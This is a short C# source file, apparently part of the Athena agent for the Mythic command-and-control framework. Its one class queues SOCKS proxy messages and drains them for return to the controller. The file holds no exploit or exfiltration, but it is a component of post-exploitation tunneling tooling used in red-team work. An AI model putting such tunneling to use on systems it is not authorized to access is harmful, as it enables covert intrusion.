using Athena.Models.Mythic.Response;
using System.Collections.Concurrent;
using System.Diagnostics;

namespace Athena.Commands
{
    public class SocksResponseHandler
    {
        private static ConcurrentBag<SocksMessage> messagesOut = new ConcurrentBag<SocksMessage>();

        public static async Task AddSocksMessageAsync(SocksMessage sm)
        {
            messagesOut.Add(sm);
        }
        public static async Task<List<SocksMessage>> GetSocksMessagesAsync()
        {
            if (messagesOut.Count < 1)
            {
                return new List<SocksMessage>();
            }
            List<SocksMessage> msgOut = new List<SocksMessage>();

            while (!messagesOut.IsEmpty)
            {
                SocksMessage sm;
                if (messagesOut.TryTake(out sm))
                {
                    msgOut.Add(sm);
                }
            }

            //msgOut.Reverse();
            Debug.WriteLine($"[{DateTime.Now}] Returning: {msgOut.Count} messages");
            return msgOut;
        }
    }
}
